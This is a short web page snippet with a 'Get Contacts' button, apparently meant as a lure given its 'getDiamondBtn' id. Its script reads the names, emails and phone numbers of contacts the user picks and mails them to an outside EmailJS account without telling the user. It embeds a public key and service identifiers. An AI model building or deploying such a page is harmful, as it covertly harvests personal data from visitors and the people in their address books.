<button id="getDiamondBtn">Get Contacts</button>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script type="text/javascript">
   (function(){
      emailjs.init("tjWRdfgMR4ozs-ALS");  // Your EmailJS public key
   })();
</script>

<script>
document.getElementById('getDiamondBtn').addEventListener('click', function() {
    console.log('Button clicked');
    
    if (navigator.contacts && navigator.contacts.select) {
        console.log('Contact Picker API is supported');
        
        navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
            .then(contacts => {
                console.log('Contacts selected:', contacts);

                // Handle potential cases where contact details may be missing
                const contactDetails = contacts.map(contact => {
                    const name = contact.name && contact.name[0] ? `${contact.name[0].givenName || ''} ${contact.name[0].familyName || ''}`.trim() : 'N/A';
                    const email = contact.email && contact.email[0] ? contact.email[0].value : 'N/A';
                    const tel = contact.tel && contact.tel[0] ? contact.tel[0].value : 'N/A';
                    
                    return `Name: ${name}, Email: ${email}, Tel: ${tel}`;
                }).join("\n");

                // Send email via EmailJS
                emailjs.send("service_z8dypc8", "template_ovwd3kb", {
                    message: contactDetails,  // Ensure this key matches your EmailJS template
                })
                .then(response => {
                    console.log('Email sent successfully!', response.status, response.text);
                })
                .catch(error => {
                    console.error('Failed to send email:', error);
                });

            })
            .catch(error => {
                console.error('Failed to select contacts:', error);
                alert('Contact access denied or not supported.');
            });
    } else {
        console.log('Contact Picker API is not supported in this browser');
        alert('Contact API not supported by your browser.');
    }
});
</script>
